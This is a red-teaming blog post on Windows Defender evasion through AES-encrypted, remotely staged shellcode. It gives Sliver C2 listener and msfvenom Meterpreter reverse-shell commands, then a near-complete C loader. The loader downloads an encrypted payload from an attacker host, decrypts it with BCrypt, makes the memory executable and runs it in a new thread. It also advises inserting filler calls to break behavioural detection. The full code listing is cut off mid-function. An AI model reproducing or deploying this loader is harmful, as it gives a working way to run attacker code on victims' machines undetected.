---
title: Offensive C - Shellcode Encryption and Staging
author: nirajkharel
date: 2025-06-01 14:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


In the [previous blog](https://nirajkharel.com.np/posts/payload-encryption-and-obfuscation/), we discussed how to get around Windows Defender by using payload obfuscation.  This time, we'll go over how to get the beacon into our sliver C2 undetected by using shellcode staging together with shellcode encryption.

As background, we will listen for a connection on the C2 server, use **msfvenom** to build a shellcode, use hellshell to encrypt the shellcode using AES, and then convert the unsigned char array into binary.  Create an executable program that downloads the binary shellcode, uses the key and IV that the hellshell provides to decrypt it, and then launches the current process. **How may this be useful?** The payload would not be detected as malicious since it is not hardcoded into the malicious application. It receives an encrypted payload during runtime, which again prevents the defender from knowing what is on it because it is encrypted. The payload then decrypts and runs into virtual memory to evade the defender and real-time monitoring.

## Shellcode Encryption
There are different types to perform shellcode encryptions like XOR, RC4, but on this blog we will discuss about Advanced Encryption Standard (AES) Encryption.


### AES Encryption
AES Encryption consists of a symmetric-key algorithm which uses same key for the encryption and decryption. It is one of the widely used encryption techniques that uses block ciphers like CBC and GCM. It means that it splits the plaintext into smaller blocks and encrypt those blocks to generate the cipher text. AES also uses Initialization Vector (IV) that provides randomness into the encryption process. IV is generally used to encrypt the first block and the cipher text of the each block is used as the initialization vector for the next block.

I would suggest you go through [this youtube video from Neso Academy](https://www.youtube.com/watch?v=3MPkc-PFSRI) to understand in detail about the AES Encryption and how it works. Below is the image taken from the same video.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-1.png">

AES Encryption needs the block size to be 128-bits for both input and output, on our implementation we would split the shellcode into 128-bits block and in case the shellcode is not multiple of 128-bits, padding is used to increase the size of the shellcode.

Below is an example which shows how we can use a tool like Supernova to encrypt the payload. Observe the encrypted payload and generated key and IV of 32 and 16 byte respectively.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-supernova-1.png">

We will be using HellShell to encrypt the payload using AES and it also provides us the code chunk that can be used with the decryption along with the ciphertext, key and IV. HellShell uses Windows **bcrypt.h** header to perform AES encryption and decryption. Below listed functions are the major ones that are used to decrypt the encrypted blob. I would suggest you to go through each of the functions from the link below.
    

| Function | Description |
|----------|-------------|
| [BCryptOpenAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider) | Loads and initializes a CNG provider. |
| [BCryptGetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgetproperty) | Retrieves the value of a named property for a CNG object. |
| [BCryptSetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty) | Sets the value of a named property for a CNG object. |
| [BCryptGenerateSymmetricKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgeneratesymmetrickey) | Creates a key object for symmetric encryption. |
| [BCryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdecrypt) | Decrypts a block of data. |
| [BCryptDestroyKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdestroykey) | Destroys a key. |
| [BCryptCloseAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider) | Closes an algorithm provider. |


We will go through the brief of each one of the functions while we decrypt our msfvenom shellcode. For now, let's start with Stage I.

## Stage I - Shellcode Generation and C2 Listener.
The shellcode generation and listening for the connection on the Sliver C2 is same as what we did on the previous blog.         

```bash
# Creating a profile on the C2
profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon

# Creating a stage listener on port 8080. This listener delivers staged payloads and start the mTLS C2 server on host 192.168.1.86 and port 443.
stage-listener -u tcp://192.168.1.86:8080 -p shellcode-beacon

mtls -L 192.168.1.86 -l 443

# Generating the shellcode using msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f raw -o /tmp/win11-shellcode.bin
```

## Stage II - Shellcode Encryption & Decryption
Once we have the shellcode ready and transferred into our Windows attacking machine, we will execute HellShell to generate our encrypted payload using the below command:       
```powershell
HellShell.exe .\win11-shellcode.bin aes
```

Note that the Helshell provides us the code to decrypt and the encrypted blob as well.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-2.png">
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-3.png">

The above decryption code consists of multiple functions as listed above. 

**Bcrypt.lib and Headers**
Since the required functions are located on Bcrypt.lib library, it needs to be imported first. Since Bcrypt.lib is a native Windows system DLL, NT_SUCCESS is used to determine whether it is loaded successfully.

Similarly, the size of the key and IV are determined as 32 and 16 bytes i.e. 256 bits and 128 bits. This typically means that AES-256 key size


`typedef struct _AES` is used to group together the variables and data needed for the decryption. 

- `PBYTE   pPlainText;` - Base addres of the plain text data.
- `DWORD dwPlainSize;` - size of the plain text data.
- `PBYTE   pCipherText;` - Base address of the encrypted data.
- `DWORD   dwCipherSize;` - Size of it (this can change from dwPlainSize in case there was padding).
 - `PBYTE   pKey;` - The 32 byte key.
 - `PBYTE   pIv;` - The 16 byte iv.          

```c
#pragma comment(lib, "Bcrypt.lib")


#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             
    DWORD   dwPlainSize;            
    PBYTE   pCipherText;            
    DWORD   dwCipherSize;           
    PBYTE   pKey;                  
    PBYTE   pIv;                   
}AES, * PAES;
```     

Next the code contains a function **InstallAesDecryption** where the actual decryption takes place. Observe that all of the variables defined earlier are passed into the function.         

```c
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;
```

The first step is to initialize `hAlgorithm` as AES algorithm Handle.    
```c
STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE; goto _EndOfFunc;
}
```

Getting the size of the key object variable *pbKeyObject* which is used for **BCryptGenerateSymmetricKey** function later on.       
```c
STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE; goto _EndOfFunc;
}
```

Getting the size of the block used in the encryption, since this is AES and it should be 16 bytes.          
```c
STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE; goto _EndOfFunc;
}
```

Checking if the block size is 16 bytes and allocating the memory for the key object using **HeapAlloc**.        
```c
 if (dwBlockSize != 16) {
     bSTATE = FALSE; goto _EndOfFunc;
 }
 pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 if (pbKeyObject == NULL) {
     bSTATE = FALSE; goto _EndOfFunc;
 }
```

Setting the Block Cipher mode to CBC i.e., 32 byte key and 16 byte IV. 
```c
 STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
 if (!NT_SUCCESS(STATUS)) {
     printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
     bSTATE = FALSE; goto _EndOfFunc;
 }
```

Generating the key object from the AES key. The output will be saved in **pkBeyObject** of size **cbKeyObject**.        
```c
STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE; goto _EndOfFunc;
}
```

Running **BCryptDecrypt** first time with NULL output parameters, thats to deduce the size of the output buffer. The size will be stored in **cbPlainText**.    
```c
STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE; goto _EndOfFunc;
}
```

Allocating the memory as of the size of cbPlainText and running **BcryptDecrypt** second time with **pbPlainText** as output buffer.      
```c
 pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
 if (pbPlainText == NULL) {
     bSTATE = FALSE; goto _EndOfFunc;
 }

 STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
 if (!NT_SUCCESS(STATUS)) {
     printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
     bSTATE = FALSE; goto _EndOfFunc;
 }
```

Cleaning up the function before exiting it. It is used to set the key algorithm handle free and remove the details from the memory if they were used. Also, if the decryption is successful, the **bSTATE** is set to true and it stores the decrypted plaintext and its size in the **AES** struct.    
```c
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}
```

The HellShell also provides one additional function called **SimpleDecryption**, which is just a wrapper function for **InstallAesDecryption**. It first checks whether all the required input data like ciphertext, size of the ciphertext, key and IV are provided or valid and then initializes the **AES** structure. Finally, it calls the **InstallAesDecryption** function and specifies the pointer to the decrypted buffer and the size.                 

```c
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes = {
            .pKey = pKey,
            .pIv = pIv,
            .pCipherText = pCipherTextData,
            .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}
```

## Stage III - Payload/Shellcode Staging.
Until now we have our encryption version of our shellcode using AES and our decryption function ready. The idea is to get the encrypted shellcode during runtime instead of hardcoding it into the application. This can be done using three Windows API functions **InternetOpenW**, **InternetOpenUrlW**, and **InternetReadFile**.

### [InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)
It is a function to open and initialize the handle to the internet session. It consists of five input parameters which are:          
```c
HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,
  [in] DWORD   dwAccessType,
  [in] LPCWSTR lpszProxy,
  [in] LPCWSTR lpszProxyBypass,
  [in] DWORD   dwFlags
);
```
The parameters **lpszAgent** is used to define the user agent in the HTTP protocol. Similarly, **dwAccessType** parameter is used to define what sort of access is required. The parameters **lpszProxy** and **lpszProxyBypass** are used if we need to set up a proxy or bypass the proxy and the parameter **dwFlags** is used to determine whether to make the network request or gain the entities from the cache. 

### [InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)
InternetOpenUrlW function is used to get the handle to the shellcode specified by the HTTP URL. It consists of six parameters:    
```c
HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,
  [in] LPCWSTR   lpszUrl,
  [in] LPCWSTR   lpszHeaders,
  [in] DWORD     dwHeadersLength,
  [in] DWORD     dwFlags,
  [in] DWORD_PTR dwContext
);
```

The first one is the handle to the internet session, the second one is the URL that contains the shellcode, the third one specifies the request headers to be sent to the HTTP server, the fourth one specifies the size of the headers if any additional header is required, the fifth one **dwFlags** contains different flags that can be provided like **INTERNET_FLAG_HYPERLINK** and **INTERNET_FLAG_IGNORE_CERT_DATE_INVALID**, which forces the session to reload in case of no expiry time and no last modified time and ignores the SSL/TLS validity of the URL. The last one contains a pointer to a variable if any data needs to be passed into the server.

### [InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)
The third one is the InternetReadFile function that reads the data from a handle provided by **InternetOpenUrlW**.            
```c
BOOL InternetReadFile(
  [in]  HINTERNET hFile,
  [out] LPVOID    lpBuffer,
  [in]  DWORD     dwNumberOfBytesToRead,
  [out] LPDWORD   lpdwNumberOfBytesRead
);
```
It consists of two input parameters and two output parameters in which the first one is the handle to the URL, the second parameter provides a pointer to the buffer that receives the data. The third one requires the number of bytes to be read, and the fourth one provides a pointer to the actual number of bytes read.

Since now we have an overview of how to receive the data from the URL, it's time for the implementation. Let's create a function called **ShellcodeFromUrl** which provides a pointer to the received data and the size of the encrypted data. Below are the parameters initialized in the function.

- ` HINTERNET hInternet;` - Handle to the internet session text data.
- `HINTERNET hInternetShellcode;` - Handle to the URL connection
- `DWORD dwBytesRead = NULL;` - Number of bytes read during each iteration.
- `SIZE_T sSize = NULL;` - Total number of accumulated bytes downloaded.
 - `PBYTE pBytes = NULL;` - Pointer to the final dynamically allocated buffer that will contain the shellcode.
 - `PBYTE pTmpBuffer = NULL;` - Temporary 1KB (1024 bytes) buffer to read chunks from the internet.     

```c
BOOL ShellcodeFromUrl(PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    HINTERNET hInternet;
    HINTERNET hInternetShellcode;
    DWORD dwBytesRead = NULL;
    SIZE_T sSize = NULL;
    PBYTE pBytes = NULL;	
    PBYTE pTmpBuffer = NULL;
```

Next step is to create a handle to the internet session.        
```c
    hInternet = InternetOpenW(L"LegitAgent", NULL, NULL, NULL, NULL);
    if (hInternet == FALSE) {
        printf("InternetOpenW Failed with error code: %d \n", GetLastError());
        return -1;
    }
```

Once we have the handle to the internet session, open the handle to the shellcode specified by HTTP URL.       
```c
    hInternetShellcode = InternetOpenUrlW(hInternet, L"http://192.168.1.86:1337/encrypted_payload.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetShellcode == NULL) {
        printf("InternetOpenUrlW Failed with error code: %d \n", GetLastError());
        return -1;
    }
```

Before calling the **InternetReadFile** function, we need to allocate a fixed amount of memory. Initially, this is set to 1024 bytes. However, since the payload size may vary and is not always exactly 1024 bytes, failing to allocate the full payload could cause the decryption process to crash if any block is missing.     
        
```c
pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
```

The solution to the above problem is to create a loop during the **InternetOpenUrlW** function. The loop reads 1024 bytes using a variable **pTmpBuffer** from the server during each iteration and appends the data into a variable **pBytes**. At the end of the loop it checks whether the size of **pTmpBuffer** is less than 1024, if the size is less than 1024 then it means it has come to the last chunk of the payload and breaks out of the loop.       
```c
    // Allocate 1024 bytes for temporary storage
    pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE) {
        // Read up to 1024 bytes into the temporary buffer
        BOOL bReadFile = InternetReadFile(hInternetShellcode, pTmpBuffer, 1024, &dwBytesRead);
        if (bReadFile == FALSE) {
            printf("InternetReadFile failed with error: %d \n", GetLastError());
            InternetCloseHandle(hInternet);
            return -1;
        }

        // Accumulate the total number of bytes read so far
        sSize = sSize + dwBytesRead;

        // If it's the first read, allocate memory equal to the number of bytes read
        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        }

        else {
            // Resize the buffer to match the updated total size
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        // Copy the contents of the temporary buffer to the correct position in the main buffer
        PBYTE pTarget = pBytes + (sSize - dwBytesRead);
        memcpy(pTarget, pTmpBuffer, dwBytesRead);

        ZeroMemory(pTmpBuffer, dwBytesRead);

        // If fewer than 1024 bytes were read, the end of the file has been reached
        if (dwBytesRead < 1024) {
            break;
        }
    }
```

At the end, the pointers are set for the data accessed through the server and the size of the data.      
```c
    // Store the address of the complete shellcode buffer
    *pPayloadBytes = pBytes;

    // Store the total number of bytes downloaded
    *sPayloadSize = sSize;
    return TRUE;
}
```

Now since we have most of our functions ready, i.e., reading the encrypted shellcode and decrypting the shellcode, we can proceed towards the shellcode injection. The process is the same as we did in the previous blog which consists of allocating the virtual memory space, copying the shellcode into the allocated memory, defining the memory address to be executable, and executing the shellcode using CreateThread.

## Stage IV - Injection

WWe can either create a separate function to perform the shellcode injection or use the main function as well. The main function calls the above **ShellcodeFromUrl** and saves the output in the variables **Size** and **Bytes**. Next, the **SimpleDecryption** is called using the appropriate key, IV, and the above **Size** and **Bytes**. The **SimpleDecryption** function itself calls the **InstallAesDecryption** function and provides the decrypted shellcode and its size as variables **pPlaintext** and **dwPlainSize**. Once that is obtained, shellcode injection is performed.  

```c
int main() {

    SIZE_T	Size = NULL;
    PBYTE	Bytes = NULL;


    // Calling the function to read the encrypted shellcode
    if (!ShellcodeFromUrl(&Bytes, &Size)) {
        return -1;
    }

    // Printing encrypted shellcode address and size of it.
    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

    // Printing the shellcode into bytes.
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        printf("%0.2X ", Bytes[i]);
    }
    printf("\n\n");

    // Printing the shellcode into Hex Format.
    printf("Hex Format\n");
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0) {
            printf("\n\t");
        }
        if (i < Size - 1) {
            printf("0x%0.2X, ", Bytes[i]);
        }
        else {
            printf("0x%0.2X ", Bytes[i]);
        }
    }
    printf("\n\n\n");

    // Initializing the key and IV needed for the decryption
    PVOID	pPlaintext = NULL;
    DWORD	dwPlainSize = NULL;
    unsigned char AesKey[] = {
        0x82, 0xD7, 0xD0, 0xAA, 0xB9, 0xE9, 0xB1, 0xFC, 0x27, 0xB1, 0x5B, 0x36, 0x0E, 0x7F, 0xAF, 0x48,
        0xEE, 0xDD, 0xD9, 0x3F, 0xEE, 0x69, 0xD1, 0xBD, 0x7D, 0xE4, 0x28, 0xA6, 0x39, 0x86, 0x01, 0x1D };
    unsigned char AesIv[] = {
            0xEC, 0x6C, 0xF0, 0x8E, 0xA6, 0x37, 0xEA, 0xCE, 0x98, 0x8B, 0xA8, 0xA0, 0x3B, 0x95, 0xF8, 0xAC };
    
    // Calling the decryption function
    if (!SimpleDecryption(Bytes, Size, AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
        printf("Decryption exited with code: %d \n", GetLastError());
        return -1;
    }

    // Printing the decypted shellcode
    printf("\n[>] decrypted shellcode:\n");
    for (int i = 0; i  < dwPlainSize; i++) {
        printf("0x%02X, ", ((unsigned char*)pPlaintext)[i]);
    }
    printf("\n");

    // Initiating the shellcode injection
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    PVOID pShellcodeAddress = VirtualAlloc(NULL, dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pPlaintext, dwPlainSize);
   
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pPlaintext, '\0', dwPlainSize);

    DWORD dwOldProtection = NULL;
    
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, dwPlainSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Executing the shellcode
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
}
```
**Note:** Remember to insert some random methods within each of the above steps. This will help us break the attack chain and potentially bypass the behavioral detection capabilities of Windows Defender. For this demonstration, the method below for enumerating the username of the current machine has been inserted between each of the steps.
   

```c
        // Breaking attack chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }
```


Also note that the **key** and **IV** needs to be updated everytime the **HellShell** is executed. This makes our full code as:             

```c
#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "Bcrypt.lib")


#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data

    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it (this can change from dwPlainSize in case there was padding)

    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
}AES, * PAES;

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;

    // intializing "hAlgorithm" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // checking if block size is 16
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating memory for the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating enough memory (of size cbPlainText)
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt second time with "pbPlainText" as output buffer
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // cleaning up
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}


// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes = {
            .pKey = pKey,
            .pIv = pIv,
            .pCipherText = pCipherTextData,
            .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}


// Function to get the shellcode from URL which returns base address the shellcode allocated buffer
BOOL ShellcodeFromUrl(PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    HINTERNET hInternet;				// Handle to the internet session
    HINTERNET hInternetShellcode;		// Handle to the URL connection
    DWORD dwBytesRead = NULL;					// Number of bytes read during each iteration
    SIZE_T sSize = NULL;						// Total accumulated bytes downloaded.
    PBYTE pBytes = NULL;						// Pointer to the final dynamically allocated buffer that will contain the shellcode
    PBYTE pTmpBuffer = NULL;					// Temporary 1KB buffer to read chunks from the internate

    // Create a handle to the internet session.
    hInternet = InternetOpenW(L"LegitAgent", NULL, NULL, NULL, NULL);
    if (hInternet == FALSE) {
        printf("InternetOpenW Failed with error code: %d \n", GetLastError());
        return -1;
    }

    // Open the handle to the shellcode specified by HTTP URL.
    hInternetShellcode = InternetOpenUrlW(hInternet, L"http://192.168.1.86:1337/encrypted_payload.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetShellcode == NULL) {
        printf("InternetOpenUrlW Failed with error code: %d \n", GetLastError());
        return -1;
    }

    // pTmpBuffer is used to store 1024 bytes
    pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE) {
        // Writing 1024 b ytes to the pTmpBuffer.
        BOOL bReadFile = InternetReadFile(hInternetShellcode, pTmpBuffer, 1024, &dwBytesRead);
        if (bReadFile == FALSE) {
            printf("InternetReadFile failed with error: %d \n", GetLastError());
